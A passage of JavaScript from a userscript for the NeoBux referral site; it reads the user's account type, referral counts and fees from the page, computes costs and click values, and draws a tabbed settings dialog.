                return function (name, defaultValue) {
                    var value;
                    name = root + name;
                    value = localStorage.getItem(name);
                    if (value === null) {
                        return defaultValue;
                    } else {
                        return value;
                    }
                };
            } else {
                return function (name, defaultValue) {
                    return defaultValue;
                };
            }
        }()),
        setValue: (function () {
            if (typeof GM_setValue === "function" &&
                    (typeof GM_setValue.toString !== "function" ||
                    GM_setValue.toString().indexOf("is not supported") === -1)) {
                return function (name, value) {
                    return GM_setValue(name, value);
                };
            } else if (typeof localStorage === "object" &&
                        typeof localStorage.setItem === "function") {
                return function (name, value) {
                    name = root + name;
                    return localStorage.setItem(name, value);
                };
            } else {
                return function (name, value) {
                };
            }
        }()),
        addStyle: (function () {
            if (typeof GM_addStyle === "function" &&
                    (typeof GM_addStyle.toString !== "function" ||
                    GM_addStyle.toString().indexOf("is not supported") === -1)) {
                return function (css) {
                    return GM_addStyle(css);
                };
            } else {
                return function (css) {
                    var
                        parent,
                        style,
                        textNode;
                    parent = document.getElementsByTagName("head")[0];
                    if (!parent) {
                        parent = document.documentElement;
                    }
                    style = document.createElement("style");
                    style.type = "text/css";
                    textNode = document.createTextNode(css);
                    style.appendChild(textNode);
                    parent.appendChild(style);
                };
            }
        }()),
        xmlhttpRequest: (function () {
            if (typeof GM_xmlhttpRequest === "function" &&
                    (typeof GM_xmlhttpRequest.toString !== "function" ||
                    GM_xmlhttpRequest.toString().indexOf("is not supported") === -1)) {
                return function (details) {
                    return GM_xmlhttpRequest(details);
                };
            } else {
                return function (details) {
                };
            }
        }()),
        log: (function () {
            if (typeof GM_log === "function" &&
                    (typeof GM_log.toString !== "function" ||
                    GM_log.toString().indexOf("is not supported") === -1)) {
                return function (message) {
                    return GM_log(message);
                };
            } else if (typeof console === "object" &&
                    typeof console.log === "function") {
                return function (message) {
                    return console.log(message);
                };
            } else {
                return function (message) {
                };
            }
        }())
    };

    function manipulatePrefs(name, value, type) {
        if (type === "set") {
            return GM.setValue(name, value);
        } else if (type === "get") {
            return GM.getValue(name, value);
        } else {
            return value;
        }
    }

    function toBool(string) {
        if (string && string.toString().toLowerCase() === "true") {
            return true;
        } else {
            return false;
        }
    }

    function fix(number) {
        if (isNaN(number)) {
            return myAccount.preferences.nanString;
        } else {
            return number.toFixed(myAccount.preferences.decimalPrecision);
        }
    }

    function selectNode(xpathExpression) {
        return document.evaluate(xpathExpression, document, null,
                XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
    }

    function selectNodes(xpathExpression) {
        var
            i,
            nodes,
            snapshot;
        snapshot = document.evaluate(xpathExpression, document, null,
                XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
        nodes = new Array(snapshot.snapshotLength);
        for (i = 0; i < snapshot.snapshotLength; i += 1) {
            nodes[i] = snapshot.snapshotItem(i);
        }
        return nodes;
    }

    function getCurrentPage(requestType) {
        customLogger("|| - getCurrentPage(requestType)", 2);
// Do not consider the URL hash (was causing problems: the hash was being included in the final variable value)
        var documentLocation = document.location.href.split("#")[0];
        if (requestType === "location") {
            var currentPage;
            if (documentLocation.indexOf("/c/rs/") > -1) {
                customLogger("/c/rs/, therefore referral statistics", 3);
                currentPage = "refStats";
            } else if (documentLocation.indexOf("/c/rl/") > -1) {
                customLogger("/c/rl/, therefore referral listings", 3);
                if (documentLocation.indexOf("ss3=1") > -1) {
                    customLogger("ss3=1, therefore direct referral listings", 3);
                    currentPage = "directRefListing";
                } else if (documentLocation.indexOf("ss3=2") > -1) {
                    customLogger("ss3=2, therefore rented referral listings", 3);
                    currentPage = "rentedRefListing";
                }
            } else {
                customLogger("unknown page", 3);
                currentPage = "unknown";
            }
            return currentPage;
        } else if (requestType === "language") {
            var languageIndex = document.body.innerHTML.indexOf("c0 f-") + 5;
            if (languageIndex > 4) {
                return document.body.innerHTML.substring(languageIndex, languageIndex + 2).toUpperCase();
            } else {
                return "US";
            }
        }
    }

// Definitions of Functions used by the script
// Functions used by classes

    function getAccountType(verbose) {
        var
            accountType,
            divs;
        divs = selectNodes("//div[@class='mbxm sb']");
        accountType = divs[divs.length - 1].textContent.replace(/^\s+|\s+$/g, "");
        if (verbose) {
            return accountType;
        } else {
            switch (accountType) {
            case "Standard":
            case "Pioneer":
                return 0;
            case "Golden":
                return 1;
            case "Emerald":
                return 2;
            case "Sapphire":
                return 3;
            case "Platinum":
                return 4;
            case "Diamond":
                return 5;
            case "Ultimate":
                return 6;
            default:
                return -1;
            }
        }
    }

    function getNumberOfRefs(refType) {
        var
            numberOfRefs,
            spanRefs;
        customLogger("||- getRefsFunction.. refType = " + refType, 2);
// If the current referrals page matches the requested "refType", grab the number of refs from the page and store the value
// Else the current page and requested "refType" are mismatched so grab the number of refs from the stored values
        if ((currentPage.name === "rentedRefListing" && refType === "Rented") ||
                (currentPage.name === "directRefListing" && refType === "Direct")) {
            spanRefs = selectNode("//span[@class='f_b']");
// If there are some digits on the page within <h1></h1> tags, grab them 
// Bugfix: This will match the '30' in the error message alerting the user that they must be at least 30 days old to have direct refs
// --> Added test for a colon ':' to prevent this happening
            if (spanRefs.textContent.match(/\d+/)) {
                numberOfRefs = parseInt(spanRefs.textContent.match(/\d+/), 10);
            } else {
// If digits cannot be found, set the number of refs to zero (0)
                numberOfRefs = 0;
            }
// Store the number of detected referrals
            manipulatePrefs("numberOf" + refType + "Refs", numberOfRefs.toString(), "set");
        }
// Now that the stored values have been updated / created, retrieve and return them
        switch (refType) {
        case "Rented":
            numberOfRefs = Number(manipulatePrefs("numberOfRentedRefs", 0, "get"));
            customLogger("getting numberOfRefs (" + refType + ") = " + numberOfRefs, "get");
            break;
        case "Direct":
            numberOfRefs = Number(manipulatePrefs("numberOfDirectRefs", 0, "get"));
            customLogger("getting numberOfRefs (" + refType + ") = " + numberOfRefs, "get");
            break;
        }
        return numberOfRefs;
    }

    function getAutoPayLimit(accountType) {
// Function that returns the autopay limit (minimum days left for autopay to apply) for each account type
        customLogger("||- getAutoPayLimit()", 2);
        customLogger("accountType = " + accountType, 2);
// 0 == Standard or Pioneer
// 1 == Golden
// 2 == Emerald
// 3 == Sapphire
// 4 == Platinum
// 5 == Diamond
// 6 == Ultimate
        switch (accountType) {
        case 0:
        case 1:
        case 2:
        case 4:
            return 20;
        case 3:
            return 18;
        case 5:
            return 14;
        case 6:
            return 10;
        }
    }

    function getRecycleCost(accountType) {
        var
            defaultRecycleCost,
            tmp;
// Set the defaults for each account type
        switch (accountType) {
        case 0:
        case 1:
        case 3:
        case 5:
            defaultRecycleCost = 0.07;
            break;
        case 2:
        case 4:
            defaultRecycleCost = 0.06;
            break;
        case 6:
            defaultRecycleCost = 0.04;
            break;
        default:
            defaultRecycleCost = 0.07;
        }
// If the current page is the rented referral listings,
// store the *actual* recycle cost
        if (currentPage.name === "rentedRefListing") {
            tmp = document.body.innerHTML.match(
                    /var p\=\[([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*)\]/);
            if (tmp !== null) {
                recycleCost = tmp[2];
                manipulatePrefs("recycleCost", recycleCost, "set");
            }
        }
// If the varibable 'recycleCost' hasn't been set yet, this will return defaultRecycleCost
// --> if the referral listings pages haven't been viewed yet
// else this will return recycleCost (the actual recycle cost retrieved from the page)
        return Number(manipulatePrefs("recycleCost", defaultRecycleCost, "get"));
    }

    function getOwnClickValue(accountType) {
        switch (accountType) {
        case 0: // Standard, Pioneer
            return 0.001;
        case 1: // Golden
            return 0.010;
        case 2: // Emerald
        case 3: // Sapphire
            return 0.012;
        case 4: // Platinum
        case 5: // Diamond
            return 0.015;
        case 6: // Ultimate
            return 0.020;
        }
    }

    function getDirectReferralClickValue(accountType) {
        switch (accountType) {
        case 0: // Standard, Pioneer
            return 0.0005;
        case 1: // Golden
            return 0.0050;
        case 2: // Emerald
        case 3: // Sapphire
        case 4: // Platinum
        case 5: // Diamond
        case 6: // Ultimate
            return 0.0100;
        }
    }

    function getRentedReferralClickValue(accountType) {
        switch (accountType) {
        case 0: // Standard, Pioneer
            return 0.0050;
        case 1: // Golden
        case 2: // Emerald
        case 3: // Sapphire
        case 4: // Platinum
        case 5: // Diamond
        case 6: // Ultimate
            return 0.0100;
        }
    }

    function getRenewalFees(renewalPeriod) {
        var
            renewCost15,
            renewCost30,
            renewCost60,
            renewCost90,
            renewCost150,
            renewCost240,
            tmp;
        if (!renewalPeriod) {
            renewalPeriod = 240;
        }
        if (currentPage.name === "rentedRefListing") {
            tmp = document.body.innerHTML.match(
                    /var p\=\[([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*),([0-9]+[\.]?[0-9]*)\]/);
            if (tmp !== null) {
                renewCost15 = tmp[3];
                renewCost30 = tmp[4];
                renewCost60 = tmp[5];
                renewCost90 = tmp[6];
                renewCost150 = tmp[7];
                renewCost240 = tmp[8];
                manipulatePrefs("renewalFees_15days", renewCost15, "set");
                manipulatePrefs("renewalFees_30days", renewCost30, "set");
                manipulatePrefs("renewalFees_60days", renewCost60, "set");
                manipulatePrefs("renewalFees_90days", renewCost90, "set");
                manipulatePrefs("renewalFees_150days", renewCost150, "set");
                manipulatePrefs("renewalFees_240days", renewCost240, "set");
            }
        }
// Return the default renewal period
        if (renewalPeriod === 1) {
            return myAccount.autopayCost;
        } else {
            return Number(manipulatePrefs("renewalFees_" + renewalPeriod + "days", renewCost240, "get"));
        }
    }

    function getGoldenPackCost(accountType) {
// Function that returns the cost of purchasing each account type
// *** EXCLUDING COST OF GOLDEN ***
        switch (accountType) {
        case 0:
        case 1:
            return 0;
        case 2:
        case 3:
            return 290;
        case 4:
        case 5:
            return 490;
        case 6:
            return 890;
        }
    }

    function getAutoPayCost(accountType) {
// Function that returns the autopay cost (per referral) for each account type
        customLogger("||- getAutoPayCost()", 2);
        customLogger("accountType = " + accountType, 2);
        var totalRentedRefs = getNumberOfRefs("Rented");
        var perAutoPayCost = 0;
// 0 == Standard or Pioneer
// 1 == Golden
// 2 == Emerald
// 3 == Sapphire
// 4 == Platinum
// 5 == Diamond
// 6 == Ultimate
//
// CORRECT @ 05/Jul/2011
//
// Referrals,      Standard, Golden, Emerald, Sapphire, Platinum, Diamond, Ultimate
// 0 -> 250,       $0.20,    $0.20,  $0.20,   $0.20,    $0.20,    $0.20,   $0.20
// 251 -> 500,     $0.21,    $0.21,  $0.21,   $0.20,    $0.21,    $0.20,   $0.20
// 501 -> 750,     $0.22,    $0.22,  $0.22,   $0.21,    $0.22,    $0.20,   $0.20
// 751 -> 1000,    $0.23,    $0.23,  $0.23,   $0.22,    $0.23,    $0.21,   $0.20
// 1001 -> 1250,   $0.24,    $0.24,  $0.24,   $0.23,    $0.24,    $0.22,   $0.21
// 1251 -> 1500,   $0.25,    $0.25,  $0.25,   $0.24,    $0.25,    $0.23,   $0.22
// 1501 -> 1750,   $0.26,    $0.26,  $0.26,   $0.25,    $0.26,    $0.24,   $0.23
// over 1750,      $0.27,    $0.27,  $0.27,   $0.26,    $0.27,    $0.25,   $0.24
//
// Monthly Cost, AutoPay
// $0.20,        $0.0057
// $0.21,        $0.0060
// $0.22,        $0.0062
// $0.23,        $0.0065
// $0.24,        $0.0068
// $0.25,        $0.0071
// $0.26,        $0.0074
// $0.27,        $0.0077
        switch (accountType) {
        case 0: // Standard or Pioneer
        case 1: // Golden
        case 2: // Emerald
        case 4: // Platinum
            if (totalRentedRefs <= 250) {
                perAutoPayCost = 0.0057;
            } else if (totalRentedRefs <= 500) {
                perAutoPayCost = 0.0060;
            } else if (totalRentedRefs <= 750) {
                perAutoPayCost = 0.0062;
            } else if (totalRentedRefs <= 1000) {
                perAutoPayCost = 0.0065;
            } else if (totalRentedRefs <= 1250) {
                perAutoPayCost = 0.0068;
            } else if (totalRentedRefs <= 1500) {
                perAutoPayCost = 0.0071;
            } else if (totalRentedRefs <= 1750) {
                perAutoPayCost = 0.0074;
            } else {
                perAutoPayCost = 0.0077;
            }
            break;
        case 3: // Sapphire
            if (totalRentedRefs <= 500) {
                perAutoPayCost = 0.0057;
            } else if (totalRentedRefs <= 750) {
                perAutoPayCost = 0.0060;
            } else if (totalRentedRefs <= 1000) {
                perAutoPayCost = 0.0062;
            } else if (totalRentedRefs <= 1250) {
                perAutoPayCost = 0.0065;
            } else if (totalRentedRefs <= 1500) {
                perAutoPayCost = 0.0068;
            } else if (totalRentedRefs <= 1750) {
                perAutoPayCost = 0.0071;
            } else {
                perAutoPayCost = 0.0074;
            }
            break;
        case 5: // Diamond
            if (totalRentedRefs <= 750) {
                perAutoPayCost = 0.0057;
            } else if (totalRentedRefs <= 1000) {
                perAutoPayCost = 0.0060;
            } else if (totalRentedRefs <= 1250) {
                perAutoPayCost = 0.0062;
            } else if (totalRentedRefs <= 1500) {
                perAutoPayCost = 0.0065;
            } else if (totalRentedRefs <= 1750) {
                perAutoPayCost = 0.0068;
            } else {
                perAutoPayCost = 0.0071;
            }
            break;
        case 6: // Ultimate
            if (totalRentedRefs <= 1000) {
                perAutoPayCost = 0.0057;
            } else if (totalRentedRefs <= 1250) {
                perAutoPayCost = 0.0060;
            } else if (totalRentedRefs <= 1500) {
                perAutoPayCost = 0.0062;
            } else if (totalRentedRefs <= 1750) {
                perAutoPayCost = 0.0065;
            } else {
                perAutoPayCost = 0.0068;
            }
            break;
        }
        return perAutoPayCost;
    }

    /** Compares two objects using
     * built-in JavaScript operators. */
    function ascend(a, b) {
        if (a < b) {
            return -1;
        } else if (a > b) {
            return 1;
        }
        return 0;
    }

    /** Returns an object that contains the count, sum,
     * minimum, median, maximum, mean, variance, and
     * standard deviation of the series of numbers stored
     * in the specified array.  This function changes the
     * specified array by sorting its contents. */
    function Stats(data) {
        this.count = data.length;
    /* Sort the data so that all seemingly
     * insignificant values such as 0.000000003 will
     * be at the beginning of the array and their
     * contribution to the mean and variance of the
     * data will not be lost because of the precision
     * of the CPU. */
        data.sort(ascend);
    /* Since the data is now sorted, the minimum value
     * is at the beginning of the array, the median
     * value is in the middle of the array, and the
     * maximum value is at the end of the array. */
        this.min = data[0];
        var middle = Math.floor(data.length / 2);
        if ((data.length % 2) !== 0) {
            this.median = data[middle];
        } else {
            this.median = (data[middle - 1] + data[middle]) / 2;
        }
        this.max = data[data.length - 1];
    /* Compute the mean and variance using a
     * numerically stable algorithm. */
        var sqsum = 0;
        this.mean = data[0];
        for (var i = 1;  i < data.length;  i += 1) {
            var x = data[i];
            var delta = x - this.mean;
            var sweep = i + 1.0;
            this.mean += delta / sweep;
            sqsum += delta * delta * (i / sweep);
        }
        this.sum = this.mean * this.count;
        this.variance = sqsum / this.count;
        this.sdev = Math.sqrt(this.variance);
    }

    /** Returns a string that shows all the properties and
     * their values for this Stats object. */
    Stats.prototype.toString = function () {
        var s = "tu";
        for (var attr in this) {
            if (typeof(this[attr]) !== "function") {
                s += "  " + attr + " " + this[attr];
            }
        }
        return s;
    };

    function customLogger(logMessage, logType) {
        var
            i,
            override_disableLogging,
            override_enableLogging,
            showMessage;
        if (loggingLevel.indexOf(0) > -1) {
            override_disableLogging = true;
        } else if (loggingLevel.indexOf(1) > -1) {
            override_enableLogging = true;
        } else {
            for (i = 0; i < loggingLevel.length; i += 1) {
                if (logType.toString().indexOf(loggingLevel[i]) > -1) {
                    showMessage = true;
                }
            }
        }
        if ((showMessage && !override_disableLogging) || override_enableLogging) {
            GM.log("Log Message [type: " + logType + "]: \n" + logMessage);
      }
    }

    var Config = {
        tabs: {},
        data: {},
        callback: null,
        init: function (settings) {
            Config.settings = settings;
        },
        close: function () {
            document.body.removeChild(Config.$("ConfigBodyWrapper"));
            document.body.removeChild(Config.$("ConfigMask"));
            window.removeEventListener("keyup", Config.keyUpHandler, true);
            if (typeof(Config.callback) === "function") {
                Config.callback();
            }
        },
        show: function (callback) {
            Config.settings = typeof Config.settings !== "undefined" ? Config.settings : Config.tabs;
            Config.callback = typeof callback === "function" ? callback : null;
            if (typeof Config.styleDrawn === "undefined") { // apply styling
                GM.addStyle(
    "#ConfigMask { position: fixed; width: 100%; height: 100%; top: 0; left: 0; background-color: #000; opacity: 0.7; z-index: 199000; } " +
    "#ConfigBodyWrapper { height: 100%; left: 0; padding: 0%; position: fixed; top: 0; white-space: normal; width: 100%; z-index: 199010;} " +
    "#ConfigBody * { background: none; border: none; color: #333; font-family: Helvetica Neue,Arial,Helvetica,sans-serif; font-size: 12px; font-weight: normal !important; line-height: 1.2em; margin: 0 !important; padding: 0 !important; text-decoration: none; } " +
    "#ConfigBody { border-radius: 5px; background: #f9f9f9; border: 1px outset #333; color: #333; cursor: default; font-family: Verdana, Arial; font-size: 1.2em; height: 80%; margin: 5% auto !important; min-width: 30em; max-width: 55em; overflow: auto; padding: 1em !important; text-align: left; width: 600px; z-index: 199010; } " +
    "#ConfigBody a { color: #000099 !important; text-decoration: underline; } " +
    "#ConfigBody strong, #ConfigContentBox strong { font-weight: bold !important; } " +
    "#ConfigBody h1 { background-color: #999; border-bottom: 1px solid #333; font-size: 1.1em !important; font-weight: bold !important; margin-bottom: 0.75em !important; padding: 0.5em !important; } " +
    "#ConfigBody h2 { font-weight: bold; margin: 0.5em 1em !important; } " +
    "#ConfigBody h1 { font-size: 13px; font-weight: bold; color: #fff; text-decoration: none; } " +
    "#ConfigBody h1 a:hover { text-decoration: underline; } " +
    "#ConfigBody li { list-style-type: circle; } " +
    "#ConfigBody p { font-size: 12px; font-weight: normal; margin-bottom: 1em !important; } " +
    "#ConfigContentPadding { display: block; height: 70%;  margin: 1em !important;} " +
    "#ConfigTabs { line-height: 1.5em !important; margin: 0.5em 0.5em -0.2em 0 !important; text-align: justify; } " +
    "#ConfigTabs span { border-radius: 5px 5px 0 0; background-color: #ddd; border: 1px solid #666; cursor: pointer; margin-right: -2px !important; padding: 2px 10px !important; position: relative; top: -2px; } " +
    "#ConfigTabs span:hover { background-color: #eee; } " +
    "#ConfigTabs span.active { background-color: #F9F9F9; cursor: inherit; border-bottom: none; font-weight: bold; padding-top: 3px !important; top: -1px; } " +
    "#ConfigTabs span.active:hover { background-color: #F9F9F9; } " +
    "#ConfigContentBox { border: 1px inset #666; height: 80%; overflow: auto; padding: 1.5em 1em 1em !important; } " +
    "#ConfigContentBox table { border-collapse: collapse !important; margin: 0 15px !important; min-width: 85%; } " +
    "#ConfigContentBox td { font-weight: normal; } " +
    "#ConfigContentBox input { border: 1px inset #666 !important; width: 4em !important; } " +
    "#ConfigContentBox td.fieldLabel { font-weight: bold !important; padding-right: 0.5em !important; text-align: right !important; } " +
    "#ConfigContentBox td select { border: 1px inset #666; min-width: 4em !important; } " +
    "#ConfigHistory { border: 1px inset #999; margin: 0 1em 1em 1em !important; max-height: 150px; overflow-y: auto; padding: 0 1em 1em !important; width: 448px; } " +
    "#ConfigHistory ul { margin-left: 2em !important; } " +
    "#ConfigClose { cursor: pointer; float: right; height: 14px; opacity: 0.5; } " +
    "#ConfigClose:hover { opacity: 0.9; } " +
    "#ConfigFooter { border: 1px solid; bottom: 0px; display: block; margin: 3% 5% !important; padding: 1em 2em !important; width: 80%; } " +
    "#ConfigFooter input { border-radius: 3px; background: no-repeat 4px center #eee; border: 1px outset #666; cursor: pointer; float: right; padding: 3px 5px 5px 20px !important; margin-left: 0.5em !important; width: 80px; text-align: center; } " +
    "#ConfigFooter input:hover { background-color: #f9f9f9; } " +
    "#ConfigFooter select { border: 1px inset #666; } " +
    "#ConfigContentBox #ConfigFieldTable td { border: 1px solid #555; padding: 3px !important; }");
                if ("undefined" !== typeof Config.css) {
                    GM.addStyle(Config.css);
                }
                Config.styleDrawn = true;
            }
// Create and insert config background mask
// noticeBg is needed because the reduced opacity is inherited by config area if applied to the noticeWrapper instead
            var noticeBg = document.createElement("div");
            noticeBg.id = "ConfigMask";
            noticeBg.style.height = "100%";
            noticeBg.style.width = "100%";
            document.body.appendChild(noticeBg);
// Create config window
            var noticeWrapper = document.createElement("div");
            noticeWrapper.id = "ConfigBodyWrapper";
            var notice = document.createElement("div");
            notice.id = "ConfigBody";
// Create heading
            var html = "<h1><img src='" + Config.icons.config + "' align='absmiddle' style='margin-top: -2px;'/>" +
                    (typeof Config.scriptName === "string" ? " " + Config.scriptName : "") + " Options <span><a href='http://userscripts.org/users/173064/scripts' style='float: right; color: #444499 !important; font-weight: bold !important; font-size: 1.2em;'><small>More scripts for NeoBux at</small> userscripts.org</a></span></h1>";
// Container for settings stuff
            html += "<div id='ConfigContentPadding'>";
// Tab bar
            html += "<div id='ConfigTabs'>";
// Draw tabs
            var i = 0;
            var firstTabId = "";
            var label;
            var id;
            for (label in Config.settings) {
                id = "configTab" + label.replace(/\s/g, "_");
                label = label.replace(" ", "&nbsp;");
                html += "<span id='" + id + "'>" + label + "</span> "; // Space after </span> is to fix tab-wrapping bug
                firstTabId = (i === 0 ? id : firstTabId);
                i += 1;
            }
            html += "</div>";
// Draw container for config to be inserted into later
            html += "<div id='ConfigContentBox'>";
            html += "</div>";
            html += "</div>";
// End actual config stuff
// Create footer
            html += "<div id='ConfigFooter'>" +
                    "<input type='button' id='ConfigCloseButton' value='Close' style='background-image: url(\"" + Config.icons.close + "\")'/>" +
                    "<span style='font-size: 0.9em; font-style: italic;'>Note: Changes are saved immediately. You need to refresh the page to see changes. Press Escape to exit.</span>" +
                    "</div>";
// End configBody
            html += "</div>";
            notice.innerHTML = html;
            noticeWrapper.appendChild(notice);
            document.body.appendChild(noticeWrapper);
// Add tab change listeners
            for (label in Config.settings) {
                id = "configTab" + label.replace(/\s/g, "_");
                Config.$(id).addEventListener("click", function () { Config.activateTab(this.id); }, false);
            }
// Add escape key press and other listener
            Config.activateTab(firstTabId);
            window.addEventListener("keyup", Config.keyUpHandler, true);
            Config.$("ConfigCloseButton").addEventListener("click", Config.close, true);
        },
// -------------------------------- "private" methods -----------------------------------------
        activateTab: function (id) {
// deactivate current tab
            var elems = Config.$("ConfigTabs").getElementsByTagName("span");
            for (var i = 0; i < elems.length; i += 1) {
                elems[i].className = "";
            }
// set current tab
            Config.$(id).className = "active";
            var key = id.replace(/^configTab/, "").replace(/_/g, " ");
            var fields = Config.settings[key].fields;
//
            var html = (typeof Config.settings[key].html === "string" ? Config.settings[key].html : "");
            html += "<table id='ConfigFieldTable'>";
            for (var fieldName in fields) {
                var field = fields[fieldName];
                var type = typeof field.type !== "string" ? "html" : field.type;
                var tip = typeof field.tip === "string" ? field.tip : "";
                var width = typeof fields[fieldName].width !== "undefined" ? (fields[fieldName].width.toString().match(/em/) ? fields[fieldName].width : (fields[fieldName].width.toString().match(/px/) ? fields[fieldName].width : fields[fieldName].width + "px")) : false;
                var height = typeof fields[fieldName].height !== "undefined" ? (fields[fieldName].height.toString().match(/em/) ? fields[fieldName].height : (fields[fieldName].height.toString().match(/px/) ? fields[fieldName].height : fields[fieldName].height + "px")) : false;
                var fieldHTML = "";
                switch (type) {
                case "spacer":
                    html += "<tr title='" + tip + "'><td colspan='2' style='height: " + height + "; border: 0px none;'>";
                    break;
                case "html":
                    html += "<tr title='" + tip + "'><td colspan='2' style='height: " + height + "; border: 0px none;'>";
                    html += field.html;
                    break;
                case "select":
                    html += "<tr title='" + tip + "'><td colspan='1' class='fieldLabel'>" +
                            (typeof field.label === "string" ? field.label : "") +
                            "</td><td style='padding-top: 0px; padding-bottom: 0px;'>";
                    fieldHTML += "<select id='configInput_" + fieldName + "'>";
                    if (typeof field.options === "undefined") {
                        alert("Options Error: " + fieldName + " of type 'select' is missing the 'options' property");
                    } else {
                        for (var text in field.options) {
                            var val = field.options[text];
                            fieldHTML += "<option value='" + val + "'" + (Config.get(fieldName).toString() === val ? " selected" : "") + ">" + text + " &nbsp;</option>";
                        }
                    }
                    fieldHTML += "</select>";
                    break;
                case "password":
                case "text": 
                    html += "<tr title='" + tip + "'><td colspan='1' class='fieldLabel'>" +
                            (typeof field.label === "string" ? field.label : "") + "</td><td>";
                    fieldHTML += "<input id='configInput_" + fieldName + "' value='" + Config.get(fieldName) + "' style='" + (width ? "width: " + width + ";" : "") + " font-family: monospace, courier new;' type='" + type + "'/>";
                    break;
                case "checkbox":
                    html += "<tr title='" + tip + "'><td colspan='1' class='fieldLabel'>" +
                            (typeof field.label === "string" ? field.label : "") + "</td><td>";
                    fieldHTML += "<input id='configInput_" + fieldName + "' type='checkbox' style='position: relative; top: 2px;'" + (Config.get(fieldName) ? "checked" : "") + "/>";
                    break;
                }
                html += typeof fields[fieldName].text === "string" ? "<table><tr><td style='border: 0px none; margin: 0px;'>" + fieldHTML + "</td><td style='border: 0px none; margin: 0px;'> &nbsp; - " + (fields[fieldName].text) + "</td></tr></table>" : "";
                html += "</td></tr>";
            }
            html += "</table>";
// Insert config HTML
            Config.$("ConfigContentBox").innerHTML = html;
// Add event listeners -- will cause the settings to be edited immediately after change
            for (var fieldName in fields) {
                switch (fields[fieldName].type) {
                case "checkbox":
                    Config.$("configInput_" + fieldName).addEventListener("change",
                            function () {
                                Config.set(this.id.toString().match(/configInput_(.+)$/)[1], this.checked ? true : false);                                 
                            },
                            false);
                    break;
                case "select":
                    Config.$("configInput_" + fieldName).addEventListener("change",
                            function () {
                                Config.set(this.id.toString().match(/configInput_(.+)$/)[1], this.value);
                            },
                            false);
                    break;
                case "password":
                case "text":
                    Config.$("configInput_" + fieldName).addEventListener("keyup",
                            function () {
                                Config.set(this.id.toString().match(/configInput_(.+)$/)[1], this.value);
                            },
                            false);
                    break;
                }
            }
        },
        keyUpHandler: function (e) {
// 'Escape' closes the config box
            if (e.keyCode === 27) {
                Config.close();
            }
        },
        icons: {
            config: "data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAALvSURBVBgZBcFNaNUFAADw3//jbe/t6d6cc2/kUpeXsEgUsSSiKIzAQxDdvCgdulgagmBXLx4K7BgRWamnOgSDIj3EusRangwlbVvOyba25tvH23v/z36/oCxLcOr7uaO48sxA9Vg7LbTTQloUtrKihXUsI8cqVvAtfo4Biix78eDItmPnX90FADaTotFOisZqJx9NUta7udnlDT/+vXkc52KAIsua/T0BmHuSqwSBOCCK6a2E9vSGojBUiTg0WvNUoz74xeTjT0OAPE376zFZwXoSaKU86dLq0OqwssXSRg4uXn/o2Fjd80OVXTFAnqaD23tCm102O7kwDMSIIsKISCAKKBDka36bXnX7YetxDJAnSbNRi7S2Mu1uKQxLUUiYB6KQSCmKUEYW17o+u/lgDadigCxJ9jb7K1qdUgYlUR4IS+RsPfhFliaeGzkhr+SyJBv74aOX/wsB8qS7d6TRazMpBSFREAjWH0lmflV21lR7e/T19fl3acmbAw+9MzT7CQRlWXrr0k+1OArb3104bvKfVKEE6fSEffv2mZ+f12w2hWFodnbW6Oio8fFxRVHUY8i6ya56vSoMKKAkCAi279bpdCwvL5uYmFCr1Rw4cEC73Vav1786c+ZMO4Q86fbFCnFIFAYEoY17tzSiTcPDw+7fv+/1kxe9e/q8R/PzRkZG7N+///Tly5fL+JVz14dw6eizeyyslWYXc/UqnVZLFEWazabh4WG1Kv19lGVgfX3d3Nyc6elpcZ4kb+DEH3dnrG7FNrqlNC8V2UEjG/MGBxeMjY2ZHP/aVFDa8/RuKysr7ty58yUuxHmaHn77tRdqH598CQDkJde+mcKAhYUFRw4f1Ol0zMzMaDQa8F6tVns/ztN0ZmG55drNuwa21Qz0Vw3UezXqvQYGh1y9etUHH5419fukxcVFy2XTrVufl1mW3bxx40YeHDp5ZQjnsBc7sRM7sAONak+lUq1WHKrds7S05M/yyF84efva2Sn4HxcNUm7wsX3qAAAAAElFTkSuQmCC",
            close: "data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAIhSURBVDjLlZPrThNRFIWJicmJz6BWiYbIkYDEG0JbBiitDQgm0PuFXqSAtKXtpE2hNuoPTXwSnwtExd6w0pl2OtPlrphKLSXhx07OZM769qy19wwAGLhM1ddC184+d18QMzoq3lfsD3LZ7Y3XbE5DL6Atzuyilc5Ciyd7IHVfgNcDYTQ2tvDr5crn6uLSvX+Av2Lk36FFpSVENDe3OxDZu8apO5rROJDLo30+Nlvj5RnTlVNAKs1aCVFr7b4BPn6Cls21AWgEQlz2+Dl1h7IdA+i97A/geP65WhbmrnZZ0GIJpr6OqZqYAd5/gJpKox4Mg7pD2YoC2b0/54rJQuJZdm6Izcgma4TW1WZ0h+y8BfbyJMwBmSxkjw+VObNanp5h/adwGhaTXF4NWbLj9gEONyCmUZmd10pGgf1/vwcgOT3tUQE0DdicwIod2EmSbwsKE1P8QoDkcHPJ5YESjgBJkYQpIEZ2KEB51Y6y3ojvY+P8XEDN7uKS0w0ltA7QGCWHCxSWWpwyaCeLy0BkA7UXyyg8fIzDoWHeBaDN4tQdSvAVdU1Aok+nsNTipIEVnkywo/FHatVkBoIhnFisOBoZxcGtQd4B0GYJNZsDSiAEadUBCkstPtN3Avs2Msa+Dt9XfxoFSNYF/Bh9gP0bOqHLAm2WUF1YQskwrVFYPWkf3h1iXwbvqGfFPSGW9Eah8HSS9fuZDnS32f71m8KFY7xs/QZyu6TH2+2+FAAAAABJRU5ErkJggg%3D%3D"
        },
